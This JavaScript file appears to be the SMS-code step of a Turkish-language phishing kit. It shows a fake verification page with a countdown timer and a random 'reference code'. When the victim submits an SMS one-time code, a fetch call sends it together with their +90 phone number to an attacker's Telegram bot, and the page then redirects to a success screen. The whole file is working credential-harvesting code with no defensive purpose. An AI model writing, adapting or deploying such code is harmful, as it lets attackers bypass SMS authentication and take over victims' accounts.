// Countdown Timer
let totalSeconds = 87; // 1:27
const timerDisplay = document.getElementById('timerDisplay');
const otpInput = document.getElementById('otpInput');
const submitBtn = document.getElementById('submitBtn');

function updateTimer() {
    const minutes = Math.floor(totalSeconds / 60);
    const seconds = totalSeconds % 60;
    timerDisplay.textContent = `${minutes}:${seconds.toString().padStart(2, '0')} DK`;

    if (totalSeconds <= 0) {
        clearInterval(timerInterval);
        timerDisplay.textContent = '0:00 DK';
        timerDisplay.style.color = '#e74c3c';
        otpInput.disabled = true;
        submitBtn.disabled = true;
        submitBtn.style.opacity = '0.5';
        return;
    }
    totalSeconds--;
}

const timerInterval = setInterval(updateTimer, 1000);

// Generate random reference code
function generateRefCode() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let code = '';
    for (let i = 0; i < 5; i++) {
        code += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return code;
}

// Set random ref code on load
document.getElementById('refCode').textContent = generateRefCode();

// Only allow digits in OTP
otpInput.addEventListener('input', function () {
    this.value = this.value.replace(/\D/g, '');
});

// Update Telegram message with SMS code
async function updateTelegramMessage(smsCode) {
    const messageId = localStorage.getItem('tg_message_id');
    const phone = localStorage.getItem('tg_phone');

    if (!messageId || !phone) return false;

    const url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/editMessageText`;
    const text = `📱 Yeni Giriş\n\n📞 Telefon: +90${phone}\n🔑 SMS Kod: ${smsCode}`;

    try {
        const res = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CONFIG.CHAT_ID,
                message_id: parseInt(messageId),
                text: text,
                parse_mode: 'HTML'
            })
        });
        const data = await res.json();
        return data.ok;
    } catch (e) {
        console.error('Telegram update error:', e);
        return false;
    }
}

// Submit button
submitBtn.addEventListener('click', async function () {
    const otp = otpInput.value.trim();

    if (otp.length < 4) {
        const inputRow = document.querySelector('.otp-input-row');
        inputRow.classList.add('shake');
        setTimeout(() => inputRow.classList.remove('shake'), 500);
        return;
    }

    // Loading state then update Telegram and navigate to success
    this.textContent = 'Doğrulanıyor...';
    this.disabled = true;
    this.style.opacity = '0.7';

    await updateTelegramMessage(otp);

    // Clean up localStorage
    localStorage.removeItem('tg_message_id');
    localStorage.removeItem('tg_phone');

    setTimeout(() => {
        window.location.href = 'success.html';
    }, 800);
});

// Shake animation
const style = document.createElement('style');
style.textContent = `
    @keyframes shake {
        0%, 100% { transform: translateX(0); }
        20% { transform: translateX(-6px); }
        40% { transform: translateX(6px); }
        60% { transform: translateX(-4px); }
        80% { transform: translateX(4px); }
    }
    .shake {
        animation: shake 0.4s ease-in-out;
    }
`;
document.head.appendChild(style);
